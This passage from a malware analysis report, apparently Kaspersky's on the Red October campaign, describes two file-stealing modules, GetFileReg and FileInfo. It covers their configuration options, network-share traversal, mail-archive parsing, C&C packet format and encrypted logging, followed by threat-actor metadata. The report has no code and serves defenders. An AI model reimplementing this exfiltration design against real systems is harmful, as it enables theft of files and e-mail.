(GMT)\n\nE8711B9DBB3E7A6FBC1DF70F7131520C 2011.07.18 07:03:52 (GMT)\n\nA8B8F616FFD94D34E4E188657A5C8BA7 2011.07.18 07:03:52 (GMT)\n\nE461B07E2A11ED13DDC0F27162545DE1 2011.07.18 07:03:52 (GMT)\n\nThe file is a PE DLL file, 0 exports, compiled with Microsoft Visual Studio 2008. All functionality\nis implemented in the DllMain function.\n\n\n-----\n\n, p, p\nAfter executing the main function, the module tries to delete the same file again.\n\n#### Main function\n\nFirst, the module initializes its main object and log headers, i.e.\n\n@fileinforeg_logGETFILEREG_STARTED_V1_%s.txt\n@fileinforeg_logGETFILEREG_V1_%s.txt\n\nThen, it retrieves its resource of type “AAA” and name “BBB”. The resource is expected to be an\nINI file compressed using Zlib. The module decompresses the data and parses the whole INI\nfile. It extracts data from the following INI sections:\n\n**INI section name** **Description**\n\ni_getfile Directory traversal and file matching rules\n\nCommon On/off switches for features, global\nsettings\n\nconn_a C&C server connection parameters\n\nkeylogger Identified but not used\n\n#### Common options\n\n**Option name** **Description**\n\ni_getfile_all_dbx Extract data from all files with ‘dbx’ extension (Outlook Express mail\narchives)\n\ni_getfile_all_tbebat Extract data from all files with ‘tbb’ extension (The Bat mail archives)\n\ni_getfile_all_thunderbird Extract data from all Thunderbird mail archives\n\ni_getfile_all_disks Traverse all fixed and network disks\n\ni_getfile_all_netdisks Traverse system network shares\n\ni_getfile_all_netshared Traverse computer’s network shares\n\nf_time_min Minimum file creation or modification time to look for\n\nf_time_max Maximum file creation or modification time to look for\n\nf_total_send_size_max Global limit on the data to be sent to the C&C server\n\nf_max_size Maximum file size to look for\n\nf_min_size Minimum file size to look for\n\nspec_check_task_existance_a Save last traversal time value and modify minimum file time option\ndepending that value\n\n#### i_getfile options\n\nThe following options apply only to the “i_getfile” section they are specified in\n\nOption name Description\nf_max_size Maximum file size to look for\n\n\n-----\n\nf_time_max Maximum file creation or modification time to look for\nf_regexp_a Regular expression to match against the filename (must match)\nf_regexp_d Regular expression to match against the filename (must not match, exclusion list)\nf_search_path Directories to traverse\nf_delete_file Delete the file after sending its contents to the C&C server\n\n#### Conn_a options\n\n**Option name** **Description**\n\nD_CONN List of C&C server domain names, separated with\n‘;’\n\nD_NAME Relative URL\n\nD_RPRT TCP port of the C&C server\n\nD_SPRT Not used\n\nD_USER Unique ID of the victim\n\nD_MODE Not used\n\nD_PASS Not used\n\nJ_CONN Not used\n\nJ_NAME Not used\n\nJ_RPRT Not used\n\nJ_SPRT Not used\n\nJ_USER Not used\n\nJ_MODE Not used\n\nJ_PASS Not used\n\nVERSION_ID Sent to C&C\n\nVER_SESSION_ID Not used\n\nSEND_DELAY_TIME Not used\n\nAfter parsing the INI file, the module tries to raise its privileges by logging on as a user with\nadministrative rights. It looks for suitable credentials in an encrypted file named “adt.dat” in the\ndirectories with CSIDLs:\n\nCSIDL_LOCAL_APPDATA (%LOCALAPPDATA%, %USERPROFILE%AppDataLocal)\nCSIDL_COMMON_APPDATA (%ALLUSERSPROFILE%)\n\nThe module sends several types of packets to the C&C server.\n\nThe first packet is sent after the configuration is read, it contains the string “===” and\nstarts with a string “Subject: Reflebt”\nIntermediate packets are sent when every traversal operation is finished, it also contains\nthe contents of the internal log file and starts with a string “Subject: Refleut”\nContents of the stolen files are sent in separate packets, they are split in chunks of size\n\n\n-----\n\nThe final packet is sent after all operations are completed, it contains a string === and\nstarts with a string “Subject: Refleet”.\n\nThe data sent to the C&C server is compressed with Zlib and encrypted with a modified PKZIP\nstream cipher, and then it is Base64-encoded.\n\n#### Directory traversal\n\nDepending on the configuration file, the module may traverse different directories:\n\nFor each “i_get_file” configuration section, the module traverses the directories named in\n“f_search_path” values of the same section.\n\nIf the “i_getfile_all_disks” global option is set, the module traverses all fixed and mounted\nnetwork drives.\n\nIf the “i_getfile_all_netdisks” global option is set, the module searches for available network\nshares and tries to mount “%computer%%drive%$” system shares for drive names from ‘C’ to ‘F’,\nthen traverses these shares.\n\nIf the “i_getfile_all_netshared’ global option is set, the module searches for all available network\nshares and traverses them.\n\nThe directories are traversed recursively, with a hardcoded depth limit of 100.\n\nThe global option “spec_check_task_existance_a” modifies the traversal and matching rules for\nlocal and network disks. If this option is set, the module tracks the time of the last traversal of\neach disk in a file named “%DRIVE%System RestoreSystem Restore Point”. This file is then used\nto correct the minimum file creation/modification rules so that the module skips the files that it\nshould have already processed.\n\n#### File matching rules\n\nThe module applies the same matching routine to all files found while traversing the disks,\nfolders and network shares.\n\nFor each file, the module checks if the file’s creation and modification time satisfy both\nminimum and maximum configuration values, its size is within the allowed range and the\nfilename is matched by at least one “f_regexp_a” regular expression and is not matched against\nany “f_regexp_d” regular expression. If the file’s properties satisfy all the requirements, the file is\nsent to the C&C server.\n\nSpecial processing is applied for the e-mail databases. The module can parse Outlook Express\ndatabases (“dbx” files), The Bat databases (“tbb” files) and Thunderbird message storages.\nDepending on the configuration options, these files may be read, processed and then extracted\ne-mail messages are sent to the C&C server.\n\nAfter all operations are completed, the module sends the final C&C request with string “Subject:\nRefleet” and returns.\n\n### FileInfo module\n\n\n-----\n\nC9686F76F827D8B16C434C84FDF9BE06 09.10.2012 5:49\n\nB6F2D2D27A91D99AB396AD7A4B4937DE 09.10.2012 5:49\n\nAC83001F4228D92F1457E5841792EAC1 09.10.2012 5:49\n\n#### Summary\n\nThe file is a PE DLL file with 2 exported functions, compiled with Microsoft Visual Studio 2010.\nAll functionality is implemented in the “START” function. The module is very similar to the\n“GetFileReg” module. It is stored on disk as an encrypted file that is loaded by the “Scheduler”\nmodule.\n\nCreates encrypted log files: “%TMP%smrdprevsmrdprev_%p_%p.tmp”, where “%p” parameters\nare formatted from the return values of subsequent GetTickCount API calls.\n\nCreates encrypted storage files: “%TEMP%%08 hex digits%hst”, where 8 hex digits represent the\nCRC32 checksum of the current user’s name.\n\nCreates mutex: “Win32Wbem32Prefetchfamt”\n\n#### START function\n\nWhen started, the module initializes its log object with a new filename using a format string\n“%TMP%smrdprevsmrdprev_%p_%p.tmp”, and sets the log header:\n\n@LOGFILEINFOAMT_1\n\nThen, it creates four data collection and directory traversal objects and loads the configuration\nINI file. The configuration file is loaded from the resource of type “BBB”, name “AAA” and is\ndecrypted using a custom AMPRNG cipher with a hardcoded key.\n\nThe code of the module appears to be a new version or a fork of the “GetFileReg” module, so are\nthe configuration options extracted from the INI file.\n\n**INI section name** **Description**\n\ni_getfile Directory traversal and file matching rules\n\nCommon On/off switches for features, global settings\n\nconn_a C&C server connection parameters, not used\n\nKeylogger Identified but not used\n\n\nnet_res_acl (new in\n‘fileinfo’)\n\n#### Common options\n\n\nNetwork share traversal and matching rules\n\n\n**Option name** **Description**\n\n\ni_process_all_net_res (new in\n‘fileinfo’)\n\n\nWhen turned on, only ‘host_d’ exclusion list is applied. When turned off, only\nnetwork paths matching ‘host_a’ are processed.\n\n\ni_getfile_all_dbx Extract data from all files with ‘dbx’ extension (Outlook Express mail\n\n\n-----\n\ni_getfile_all_thunderbird Extract data from all Thunderbird mail archives\n\ni_getfile_all_disks Traverse all fixed and network disks\n\ni_getfile_all_netdisks Traverse system network shares\n\ni_getfile_all_netshared Traverse computer’s network shares\n\nf_time_min Minimum file creation or modification time to look for\n\nf_time_max Maximum file creation or modification time to look for\n\nf_total_send_size_max Global limit on the data to be sent to the C&C server\n\n\nf_use_hash_storage (new in\n‘fileinfo’)\n\n\nStore MD5 hashes of files and e-mails that were already processed, skip\nalready processed items\n\n\nf_max_size Maximum file size to look for\n\nf_min_size Minimum file size to look for\n\nspec_check_task_existance_a Save last traversal time value and modify minimum file time option\ndepending that value\n\nlog_level (new in ‘fileinfo’) Level of log verbosity: ‘normal’, ‘quiet’, ‘extend’\n\n\nprocess_ldisks_sleep (new in\n‘fileinfo’)\n\nprocess_ndisks_sleep (new in\n‘fileinfo’)\n\nprocess_nshare_sleep (new\nin ‘fileinfo’)\n\nprocess_spaths_sleep (new\nin ‘fileinfo’)\n\n#### i_getfile options\n\n\nDelay between each traversal, ‘PROC_LDISKS’\n\nDelay between each traversal, ‘PROC_NDISKS’\n\nDelay between each traversal, ‘PROC_NSHARES’\n\nDelay between each traversal, ‘PROC_SPATHS’\n\n\nThe following options apply only to the “i_getfile” section they are specified in\n\n**Option name** **Description**\n\n\nf_use_hash_storage (new in\n‘fileinfo’)\n\n\nThe same as in the ‘common’ section\n\n\nf_max_size Maximum file size to look for\n\nf_min_size Minimum file size to look for\n\nf_time_min Minimum file creation or modification time to look for\n\nf_time_max Maximum file creation or modification time to look for\n\nf_regexp_a Regular expression to match against the filename (must match)\n\nf_regexp_d Regular expression to match against the filename (must not match,\nexclusion list)\n\nf_search_path Directories to traverse\n\nf_delete_file Delete the file after sending its contents to the C&C server\n\n#### t l ti ( i “fil i f ”)\n\n\n-----\n\nhost_a Regular expression of network locations that should be traversed\n\nhost_d Regular expression of network locations that should not be traversed (exclusion\nlist)\n\nThen, the module starts four threads and assigns each traversal object to a thread. Every thread\nhas a distinct scope of subjects to process:\n\n1. Directories shared over the network, called “PROC_SHARES”\n2. Disks shared over the network, called “PROC_NDISKS”\n3. Search paths specified in “i_getfile” sections, called “PROC_SPATHS”\n4. Local disks, called “PROC_LDISKS”\n\nThe actual file matching and directory traversal code is almost identical to the one implemented\nin “GetFileReg”. There are only minor updates to the algorithm:\n\nRemote directory and disk paths are matched against “host_a” or “host_d” regular\nexpressions. The remote location is traversed only if “host_a” regular expression is\nmatched, or if “i_process_all_net_res” is set and the location is not matched by any of the\n“host_d” regular expressions.\nRemote disks are enumerated from “C$” to “Z$”\nIf “f_use_hash_storage” option is turned on, the module creates a binary hash storage in a\nfile named “%TEMP%%08 hex digits%hst”, where 8 hex digits represent the CRC32\nchecksum of the current user’s name. It populates that storage with information about\nevery processed file, including file size, creation date and MD5 hash of file’s name. The\nmodule checks every new file this hash storage, and skips the file that were already\nprocessed.\n\nSince traversal routines are now executed in separate threads, the “fileinfo” module introduces\ncontinuous mode of operation. Four options control this behavior, each corresponding to one\nthread:\n\nprocess_ldisks_sleep\nprocess_ndisks_sleep\nprocess_nshare_sleep\n\nprocess_spaths_sleep\n\nThe directory traversal threads run their code in infinite loops, and “sleep” values specify the\ndelay in milliseconds that should pass between iterations.\n\n#### Data exfiltration\n\nAlthough the module extracts the C&C server information from its configuration file, it does not\ninteract with the C&C server in any way. All information including collected file names and\ncontents is stored in its encrypted log files (“%TMP%smrdprevsmrdprev_%p_%p.tmp”).\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2013/2013.01.14.Red_October_Campaign/securelist.com-Red%20October%20Detailed%20Malware%20Description%205%20Second%20Stage%20of%20Attack.pdf"
    ],
    "report_names": [
        "securelist.com-Red October Detailed Malware Description 5 Second Stage of Attack"
    ],
    "threat_actors": [
        {
            "id": "4b076dcb-516e-42fb-9c8f-f153902cd5e9",
            "created_at": "2022-10-25T16:07:23.708745Z",
            "updated_at": "2025-03-27T02:02:09.935617Z",
            "deleted_at": null,
            "main_name": "Hidden Lynx",
            "aliases": [
                "Aurora Panda",
                "Group 8",
                "Hidden Lynx",
                "Operation SMN"
            ],
            "source_name": "ETDA:Hidden Lynx",
            "tools": [
                "AGENT.ABQMR",
                "AGENT.AQUP.DROPPER",
                "AGENT.BMZA",
                "AGENT.GUNZ",
                "BlackCoffee",
                "HiKit",
                "MCRAT.A",
                "Mdmbot.E",
                "Moudoor",
                "Naid",
                "PNGRAT",
                "Trojan.Naid",
                "ZoxPNG",
                "gresim"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "761d1fb2-60e3-46f0-9f1c-c8a9715967d4",
            "created_at": "2023-01-06T13:46:38.269054Z",
            "updated_at": "2025-03-27T02:00:02.789278Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "TG-0110",
                "Group 6",
                "Buckeye",
                "Boyusec",
                "BORON",
                "BRONZE MAYFAIR",
                "Red Sylvan",
                "GOTHIC PANDA"
            ],
            "source_name": "MISPGALAXY:APT3",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a7aefdda-98f1-4790-a32d-14cc99de2d60",
            "created_at": "2023-01-06T13:46:38.281844Z",
            "updated_at": "2025-03-27T02:00:02.792526Z",
            "deleted_at": null,
            "main_name": "APT17",
            "aliases": [
                "G0025",
                "AURORA PANDA",
                "Group 72",
                "G0001",
                "HELIUM",
                "Group 8",
                "Hidden Lynx",
                "Tailgater Team",
                "BRONZE KEYSTONE"
            ],
            "source_name": "MISPGALAXY:APT17",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "06f622cb-3a78-49cf-9a4c-a6007a69325f",
            "created_at": "2022-10-25T16:07:23.315239Z",
            "updated_at": "2025-03-27T02:02:09.733197Z",
            "deleted_at": null,
            "main_name": "APT 3",
            "aliases": [
                "APT 3",
                "Bronze Mayfair",
                "Buckeye",
                "Gothic Panda",
                "Group 6",
                "Operation Clandestine Fox",
                "Operation Clandestine Fox, Part Deux",
                "Operation Clandestine Wolf",
                "Operation Double Tap",
                "Red Sylvan",
                "TG-0110",
                "UPS Team"
            ],
            "source_name": "ETDA:APT 3",
            "tools": [
                "APT3 Keylogger",
                "Agent.dhwf",
                "BKDR_HUPIGON",
                "Backdoor.APT.CookieCutter",
                "Badey",
                "Bemstour",
                "CookieCutter",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EXL",
                "EternalBlue",
                "HTran",
                "HUC Packet Transmit Tool",
                "Hupigon",
                "Hupigon RAT",
                "Kaba",
                "Korplug",
                "LaZagne",
                "MFC Huner",
                "OSInfo",
                "Pirpi",
                "PlugX",
                "RedDelta",
                "RemoteCMD",
                "SHOTPUT",
                "Sogu",
                "TIGERPLUG",
                "TTCalc",
                "TVT",
                "Thoper",
                "Xamtrav",
                "remotecmd",
                "shareip",
                "w32times"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3aaf0755-5c9b-4612-9f0e-e266ef1bdb4b",
            "created_at": "2022-10-25T16:07:23.480196Z",
            "updated_at": "2025-03-27T02:02:09.826059Z",
            "deleted_at": null,
            "main_name": "Comment Crew",
            "aliases": [
                "APT 1",
                "BrownFox",
                "Byzantine Candor",
                "Byzantine Hades",
                "Comment Crew",
                "Comment Panda",
                "GIF89a",
                "Group 3",
                "Operation Oceansalt",
                "Operation Seasalt",
                "Operation Siesta",
                "Shanghai Group",
                "TG-8223"
            ],
            "source_name": "ETDA:Comment Crew",
            "tools": [
                "Auriga",
                "Cachedump",
                "Chymine",
                "CookieBag",
                "Darkmoon",
                "GDOCUPLOAD",
                "GLOOXMAIL",
                "GREENCAT",
                "Gen:Trojan.Heur.PT",
                "GetMail",
                "Hackfase",
                "Hacksfase",
                "Helauto",
                "Kurton",
                "LETSGO",
                "LIGHTBOLT",
                "LIGHTDART",
                "LOLBAS",
                "LOLBins",
                "LONGRUN",
                "Living off the Land",
                "Lslsass",
                "MAPIget",
                "ManItsMe",
                "Mimikatz",
                "MiniASP",
                "Oceansalt",
                "Pass-The-Hash Toolkit",
                "Poison Ivy",
                "ProcDump",
                "Riodrv",
                "SPIVY",
                "Seasalt",
                "ShadyRAT",
                "StarsyPound",
                "TROJAN.COOKIES",
                "TROJAN.FOXY",
                "TabMsgSQL",
                "Tarsip",
                "Trojan.GTALK",
                "WebC2",
                "WebC2-AdSpace",
                "WebC2-Ausov",
                "WebC2-Bolid",
                "WebC2-Cson",
                "WebC2-DIV",
                "WebC2-GreenCat",
                "WebC2-Head",
                "WebC2-Kt3",
                "WebC2-Qbp",
                "WebC2-Rave",
                "WebC2-Table",
                "WebC2-UGX",
                "WebC2-Yahoo",
                "Wordpress Bruteforcer",
                "bangat",
                "gsecdump",
                "pivy",
                "poisonivy",
                "pwdump",
                "zxdosml"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716493,
    "ts_updated_at": 1743041142,
    "ts_creation_date": 1545363300,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/9fd39a98ef48a12695acf4bc6e1c595055c471eb.pdf",
        "text": "https://archive.orkl.eu/9fd39a98ef48a12695acf4bc6e1c595055c471eb.txt",
        "img": "https://archive.orkl.eu/9fd39a98ef48a12695acf4bc6e1c595055c471eb.jpg"
    }
}